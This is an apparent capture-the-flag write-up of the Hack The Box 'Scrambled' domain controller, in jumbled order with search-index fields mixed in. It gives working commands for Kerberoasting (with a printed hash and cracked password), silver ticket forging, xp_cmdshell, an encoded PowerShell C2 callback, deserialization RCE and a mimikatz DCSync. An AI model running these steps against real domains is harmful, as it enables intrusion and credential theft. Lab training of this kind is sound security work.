Nothing interesting beside that the port is open. nmap 10 .10.11.168 -sC -sV -vv -p 4411 PORT STATE SERVICE REASON VERSION 4411 /tcp open found? syn-ack | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3 ; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3 ; | _ ERROR_UNKNOWN_COMMAND ; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V = 7 .91%I = 7 %D = 7 /15%Time = 62D1288A%P = x86_64-pc-linux-gnu%r ( NU SF:LL,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( GenericLines,1D, \"SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( GetRequest,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\. SF:3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( HTTPOptions,35, \"SCRAMBLECORP_ORDER SF:S_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( RTSPRequest,35, \"SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( RPCCheck,1D, \"SCR SF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( DNSVersionBindReqTCP,1D, \"SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( DNSStatusRequestTCP,1D, \"SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n\" ) %r ( Help,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNO SF:WN_COMMAND;\\r\\n\" ) %r ( SSLSessionReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n SF:\" ) %r ( TerminalServerCookie,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( TLS SF:SessionReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( Kerberos,1D, \"SCRAM SF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( SMBProgNeg,1D, \"SCRAMBLECORP_ORDERS_V1\\ SF:.0\\.3;\\r\\n\" ) %r ( X11Probe,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( FourO SF:hFourRequest,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND SF:;\\r\\n\" ) %r ( LPDString,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_ SF:COMMAND;\\r\\n\" ) %r ( LDAPSearchReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) % SF:r ( LDAPBindReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( SIPOptions,35, \" SF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( LANDesk SF:-RC,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( TerminalServer,1D, \"SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( NCP,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r SF:\\n\" ) %r ( NotesRPC,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( JavaRMI,1D, \"S SF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( WMSRequest,1D, \"SCRAMBLECORP_ORDERS SF:_V1\\.0\\.3;\\r\\n\" ) %r ( oracle-tns,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r SF: ( ms-sql-s,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( afp,1D, \"SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( giop,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) ; Also, we can run nc . nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; test ERROR_UNKNOWN_COMMAND ; Going back to web pages, the web page /passwords.html disclose useful information. Which is: we will reset your password to be the same as the username. So now we know that if we attempt to reset a user password, the new password will be same as the username. From this information, let's try to hunt for users. User Enumeration \u00b6 Because it is Domain Controller we can enumerate valid Domain Users using Pre-Authentication . Note The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named \"pre-authentication\" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast. For further reading refer to this resource . To enumerate the valid Domain Users I'll use Impacket's GetNPUsers and shorter wordlist that can be found here . We can also use the wordlist /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt but will take too much of time. To enumerate the valid Domain Users run the following command: GetNPUsers.py scrm.local/ -no-pass -dc-ip 10 .10.11.168 -usersfile A-ZSurnames.txt Alternatively, we can use Kerbrute which is faster because it is based in Golang. Kerbrute can be downloaded from here ./kerbrute userenum -d scrm.local A-ZSurnames.txt --dc dc1.scrm.local __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/ | _ | \\_ __/_/ /_.___/_/ \\_ _,_/ \\_ _/ \\_ __/ Version: v1.0.3 ( 9dad6e1 ) - 07 /15/22 - Ronnie Flathers @ropnop 2022 /07/15 05 :36:26 > Using KDC ( s ) : 2022 /07/15 05 :36:26 > dc1.scrm.local:88 2022 /07/15 05 :36:27 > [ + ] VALID USERNAME: ASMITH@scrm.local 2022 /07/15 05 :38:25 > [ + ] VALID USERNAME: JHALL@scrm.local 2022 /07/15 05 :38:39 > [ + ] VALID USERNAME: KSIMPSON@scrm.local 2022 /07/15 05 :38:47 > [ + ] VALID USERNAME: KHICKS@scrm.local 2022 /07/15 05 :40:25 > [ + ] VALID USERNAME: SJENKINS@scrm.local Password Spray \u00b6 After finding valid Domain Users, let's conduct password spray attacks using the username as password for each user. Here we can use smartbrute tool. Bug I had an issue during while solving the machine. NTLM authentication is disabled we can use kerberos authentication instead. The issue is when using tools such as crackmapexec or impacket sometime it will fail and does not give us any information. To solve this issue use -k flag to make use of kerberos authentication. Enumerate SPNs \u00b6 After obtaining valid creds, we might be able to enumerate SPNs account using Impacket's GetUserSPNs . As I said before the NTLM authentication will not work we should use the flag -k . Hence, I found an issue in GetUserSPNs to solve this issue refer to this link . GetUserSPNs.py scrm.local/ksimpson: 'ksimpson' -dc-ip dc1.scrm.local -request -k Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ - ] CCache file is not found. Skipping... [ - ] CCache file is not found. Skipping... ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------ -------- -------------------------- -------------------------- ---------- MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021 -11-03 12 :32:02.351452 2022 -07-15 04 :08:04.045229 MSSQLSvc/dc1.scrm.local sqlsvc 2021 -11-03 12 :32:02.351452 2022 -07-15 04 :08:04.045229 [ - ] CCache file is not found. Skipping... $krb5tgs$23$* sqlsvc $SCRM .LOCAL $scrm .local/sqlsvc* $031 a9fba52ac8c46413a559f05f2fe1f $befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f Now we retrieve the TGS of the SPN account sqlsvc , we can use hashcat to crack the TGS ticket. hashcat -a 0 -m 13100 sqlsvc-spn /usr/share/wordlists/rockyou.txt --force $krb5tgs$23$* sqlsvc $SCRM .LOCAL $scrm .local/sqlsvc* $031 a9fba52ac8c46413a559f05f2fe1f $befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f :Pegasus60 We cracked sqlsvc 's password which is: Pegasus60 . As seen previously the service account sqlsvc is allowed to access MSSQL service. Enumerate Shares \u00b6 Because of NTLM authentication is disabled we will use kerberos as authetication protocol. To do this, we can export user's ticket using Impacket's GetTGT : getTGT.py scrm.local/ksimpson: 'ksimpson' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Saving ticket in ksimpson.ccache The Domain User ksimpson 's ticket is exported in the file ksimpsone.ccache . Then, we have to save the exported ticket in the variable KRB5CCNAME in order to use the flag -k . export KRB5CCNAME = 'ksimpson.ccache' Now we can access shared folders for the Domain User ksimpson : impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass # shares ADMIN$ C$ HR IPC$ IT NETLOGON Public Sales SYSVOL # use public # ls drw-rw-rw- 0 Thu Nov 4 18 :23:19 2021 . drw-rw-rw- 0 Thu Nov 4 18 :23:19 2021 .. -rw-rw-rw- 630106 Fri Nov 5 13 :45:07 2021 Network Security Changes.pdf # get Network Security Changes.pdf # exit From Public shared folder we identify a document that contains: After reading the letter we verified that the NTLM authentication is disabled in the machine. Access MSSQL \u00b6 What we can do now is access MSSQL service using sqlsvc service account via kerberos authentication. To do that, first we have to request for Ticket-Granting Service (TGS) ticket that will allows us to access the MSSQL service, or let's say we conduct silver ticket attack. Before we do that, we have to know SID of the domain. We can run SecretDump with the flag -debug : secretsdump scrm.local/ksimpson@dc1.scrm.local -k -no-pass -debug Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ + ] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket [ + ] Using Kerberos Cache: ksimpson.ccache ... [ + ] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 ... From the SecretDump output, the SID for the Domain SCRM.LOCAL is: S-1-5-21-2743207045-1827831105-2542523200 . I removed 500 because it is represents the Domain Administrator. Furthermore, to conduct the attack the NTLM hash of the service account sqlsvc is required. We can convert the password of the service account sqlsvc to NTLM hash using Python. import hashlib , binascii hash = hashlib . new ( 'md4' , \"Pegasus60\" . encode ( 'utf-16le' )) . digest () print ( binascii . hexlify ( hash )) sqlsvc NTLM hash is: b999a16500b87d17ec7f2e2a68778f05 Now we will use Impacket's ticket to generate TGS that will allow us to access MSSQL service: ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local administrator Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Creating basic skeleton ticket and PAC Infos [ * ] Customizing ticket for scrm.local/administrator [ * ] PAC_LOGON_INFO [ * ] PAC_CLIENT_INFO_TYPE [ * ] EncTicketPart [ * ] EncTGSRepPart [ * ] Signing/Encrypting final ticket [ * ] PAC_SERVER_CHECKSUM [ * ] PAC_PRIVSVR_CHECKSUM [ * ] EncTicketPart [ * ] EncTGSRepPart [ * ] Saving ticket in administrator.ccache The TGS ticket saved in the file administrator.ccache we have to save it in the variable KRB5CCACHENAME : export KRB5CCNAME = 'administrator.ccache' Now we can access MSSQL: impacket-mssqlclient dc1.scrm.local -dc-ip 10 .10.11.168 -k -no-pass Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Encryption required, switching to TLS [ * ] ENVCHANGE ( DATABASE ) : Old Value: master, New Value: master [ * ] ENVCHANGE ( LANGUAGE ) : Old Value: , New Value: us_english [ * ] ENVCHANGE ( PACKETSIZE ) : Old Value: 4096 , New Value: 16192 [ * ] INFO ( DC1 ) : Line 1 : Changed database context to 'master' . [ * ] INFO ( DC1 ) : Line 1 : Changed language setting to us_english. [ * ] ACK: Result: 1 - Microsoft SQL Server ( 150 7208 ) [ ! ] Press help for extra shell commands SQL> After obtaining access into MSSQL, the first thing we can do is enable xp_cmdshell to allow us to execute commands: SQL> enable_xp_cmdshell [ * ] INFO ( DC1 ) : Line 185 : Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. [ * ] INFO ( DC1 ) : Line 185 : Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. SQL> disable_xp_cmdshell enable_xp_cmdshell exit help lcd shell xp_cmdshell SQL> xp_cmdshell whoami output -------------------------------------------------------------------------------- scrm \\s qlsvc NULL SQL> Configuring PoshC2 \u00b6 First of all, create a new project and name it as you want. I'll name it as htb . posh-project htb Then, configure the newly created profile. posh-config Go to the 14th line and point the value of PayloadCommsHost to your VPN IP. PayloadCommsHost: \"https://<your_vpn_ip>\" Start the PoshC2 server by typing sudo posh-server In another windows connect the team server posh -u user1 Now we have two windows. At the left is the team server and at the right is the user terminal. To make use of the C2 we should drop our beacon or payload into the box usually we have command execution in the box. There is a lots of payloads types that PoshC2 generates such as Powershell reverse shell , Dlls , EXEs , Macros , DotNet2JS or even HTAs which can be used in phishing campaigns. Obtaining Access \u00b6 As I said PoshC2 have generated several payloads types, as demonstration we can use powershell oneliner. Run this command in MSSQL. SQL> xp_cmdshell powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgB....FMA After running this command in MSSQL we will receive a new implant in our C2. Team server window: Operation window: If we execute the command help we can do many useful operations such as: Active Directory enumeration, lateral movement, privilege escalation and many. As an example, let's enumerate domain objects ACLs: SCRM \\s qlsvc @ DC1 ( PID:5948 ) PS 1 > invoke-aclscanner # teamserver: Task 00003 ( user1 ) returned against implant 1 on host SCRM \\s qlsvc @ DC1 ( 2022 -07-15 07 :56:23 ) ObjectDN : DC = RootDNSServers,CN = MicrosoftDNS,CN = System,DC = scrm,DC = local AceQualifier : AccessAllowed ActiveDirectoryRights : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner ObjectAceType : None AceFlags : ContainerInherit, Inherited AceType : AccessAllowed InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-2743207045-1827831105-2542523200-1101 IdentityReferenceName : DnsAdmins IdentityReferenceDomain : scrm.local IdentityReferenceDN : CN = DnsAdmins,CN = Users,DC = scrm,DC = local IdentityReferenceClass : group ObjectDN : DC = @,DC = RootDNSServers,CN = MicrosoftDNS,CN = System,DC = scrm,DC = local AceQualifier : AccessAllowed ActiveDirectoryRights : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner ObjectAceType : None AceFlags : ContainerInherit, Inherited AceType : AccessAllowed InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-2743207045-1827831105-2542523200-1101 IdentityReferenceName : DnsAdmins IdentityReferenceDomain : scrm.local IdentityReferenceDN : CN = DnsAdmins,CN = Users,DC = scrm,DC = local IdentityReferenceClass : group Pivot to MiscSQL \u00b6 Going back to MSSQL, enumerate the databases: SQL > SELECT name FROM master . dbo . sysdatabases ; name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb ScrambleHR Enumerating the database ScrambleHR tables disclose for us the table UserImport SELECT * FROM SYSOBJECTS The table UserImport contains a Domain User creds: SQL > select * from UserImport LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups -------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- ------------- MiscSvc ScrambledEggs9900 scrm . local 90 0 SQL > The creds are MiscSvc:ScrambledEggs9900 we can test the validity of the obtained creds using PoshC2 PS 1 > test-adcredential -domain scrm.local -user miscsvc -password ScrambledEggs9900 Team Server: Task 00023 ( user1 ) returned against implant 1 on host SCRM \\s qlsvc @ DC1 ( 2022 -07-15 08 :23:53 ) Username Password IsValid -------- -------- ------- miscsvc ScrambledEggs9900 True To pivot to the Domain User MiscSVC run the following command in operations window: $password = ConvertTo-SecureString \"ScrambledEggs9900\" -AsPlainText -Force $creds = new-object system.management.automation.pscredential ( \"scrm.local\\miscsvc\" , $password ) invoke-command -computer . -scriptblock { <PoshC2 powershell oneliner payload> } -credential $creds After running the commands we will receive new implant as the domain user miscsvc Now we obtain access as miscsvc Privilege Escalation \u00b6 Enumerating Sales App \u00b6 By enumerating the host, we will identifies executable application \" Sales Order App \" which is locate at: c:\\shares\\it\\apps\\Sales Order Client . We can download both files using PoshC2 by issuing the following command: download-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleClient.exe\" download-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleLib.dll\" The download location is at: /var/poshc2/htb/downloads . Here I used dnSpy to decompile the .NET applications. I focused in the .dll. After enumerating the source code of ScrambleLib.dll , found a function called UploadOrder that takes the input and deserialize it. From the first code, we can identify that we can pass the string UPLOAD_ORDER followed by simi-column followed by serialize object in base64 format. After passing this input the server will deserialize it and execute it. public static string GetCodeFromMessageType ( ScrambleNetRequest . RequestType MsgType ) { if ( ScrambleNetRequest . _MessageTypeToCode == null ) { ScrambleNetRequest . _MessageTypeToCode = new Dictionary < ScrambleNetRequest . RequestType , string > (); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . CloseConnection , \"QUIT\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . ListOrders , \"LIST_ORDERS\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . AuthenticationRequest , \"LOGON\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . UploadOrder , \"UPLOAD_ORDER\" ); } return ScrambleNetRequest . _MessageTypeToCode [ MsgType ]; public void UploadOrder ( SalesOrder NewOrder ) { try { Log . Write ( \"Uploading new order with reference \" + NewOrder . ReferenceNumber ); string text = NewOrder . SerializeToBase64 (); Log . Write ( \"Order serialized to base64: \" + text ); ScrambleNetResponse scrambleNetResponse = this . SendRequestAndGetResponse ( new ScrambleNetRequest ( ScrambleNetRequest . RequestType . UploadOrder , text )); ScrambleNetResponse . ResponseType type = scrambleNetResponse . Type ; if ( type != ScrambleNetResponse . ResponseType . Success ) { throw new ApplicationException ( scrambleNetResponse . GetErrorDescription ()); } Log . Write ( \"Upload successful\" ); } catch ( Exception ex ) { Log . Write ( \"Error: \" + ex . Message ); throw ex ; } } As verification we can pass the string UPLOAD_ORDER followed by anything: htb/downloads \u2192 nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; UPLOAD_ORDER ERROR_GENERAL ; Error deserializing sales order: Attempting to deserialize an empty stream. UPLOAD_ORDER ; 1 ERROR_GENERAL ; Error deserializing sales order: Invalid length for a Base-64 char array or string. As we can see the server takes the string after the simi-column and attempt to deserialize it. We can abuse this to obtain command executing by passing serialized reverse shell command. Now connect to Sales app server using netcat and enter the deserialized string as below: nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; UPLOAD_ORDER ; AAEAAAD/////... After short time we will receive a new implant as SYSTEM . Finally, we can conduct DCSync towards the Domain Controller from PoshC2 using the following command: invoke-mimikatz -command '\"privilege::debug\" \"lsadump::dcsync /domain:scrm.local /all\"' Lesson Learned \u00b6 Using PoshC2 as Command & Control for PT Operations. User enumeration via pre-authetication. Dealing with kerberos authentication to lateral movements and pivoting. .NET source code review. Deserialization attack.","title":"Writeup"},{"location":"Writeups/machines/scrambled/writeup/#overview","text":"Scrambled machine was a Domain Controller which attracted me to walk through it. The attack scenario was interesting where it starts from hunting for domain users, pivoting into service accounts, .NET source code review and exploiting application using deserialization vulnerability. The box contains multiple pivoting points to reach the Domain Admin. However, I did not like that the NTLM authentication is disabled in the box, I had multiple issues while using Impacket's tools that took me time to solve those issues. In this blog, I'll demonstrate the attack scenario to Pwn this box with the help of PoshC2 framework. PoshC2 is very powerful tool for red teamers and can be customizable. However, because of the box doesn't have AV solution, I'll use the default profile/configuration of PoshC2.","title":"Overview"},{"location":"Writeups/machines/scrambled/writeup/#machine-info","text":"Operating System Difficulty IP Windows Medium 10.10.11.168","title":"Machine Info"},{"location":"Writeups/machines/scrambled/writeup/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/scrambled/writeup/#attack-scenario-diagram","text":"","title":"Attack Scenario Diagram"},{"location":"Writeups/machines/scrambled/writeup/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/scrambled/writeup/#nmap","text":"PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Simple DNS Plus 80 /tcp open http syn-ack Microsoft IIS httpd 10 .0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST | _ Potentially risky methods: TRACE | _http-server-header: Microsoft-IIS/10.0 | _http-title: Scramble Corp Intranet 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2022 -07-15 08 :40:57Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 1433 /tcp open ms-sql-s syn-ack Microsoft SQL Server 2019 15 .00.2000.00 ; RTM 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 3269 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm Service Info: Host: DC1 ; OS: Windows ; CPE: cpe:/o:microsoft:windows Host script results: | _clock-skew: mean: 0s, deviation: 0s, median: 0s | ms-sql-info: | 10 .10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15 .00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | _ TCP port: 1433 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 ( port 42300 /tcp ) : CLEAN ( Timeout ) | Check 2 ( port 40536 /tcp ) : CLEAN ( Timeout ) | Check 3 ( port 9648 /udp ) : CLEAN ( Timeout ) | Check 4 ( port 31813 /udp ) : CLEAN ( Timeout ) | _ 0 /4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2 .02: | _ Message signing enabled and required | smb2-time: | date: 2022 -07-15T08:41:43 | _ start_date: N/A By looking into nmap scan results, the ports 53, 389 and 636 are opened this indicates that the host is Domain Controller. Furthermore, the Domain Name is scrm.local and the hostname is DC1.scrm.local we have to add it to our hosts file. Another useful information from nmap results we identified that the port 1433 is open which represent MSSQL service.","title":"nmap"},{"location":"Writeups/machines/scrambled/writeup/#web-enumeration","text":"Going through the web page /support.html we will notice an alert which stats the following message: Below the alert message, there is several web pages we can look into. By navigating into /salesorders.html web page, we will notice a guidance of using Sales Orders App . From the guidance we can see a new port which is 4411. Running nmap will give us the following results. Nothing interesting beside that the port is open. nmap 10 .10.11.168 -sC -sV -vv -p 4411 PORT STATE SERVICE REASON VERSION 4411 /tcp open found? syn-ack | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, 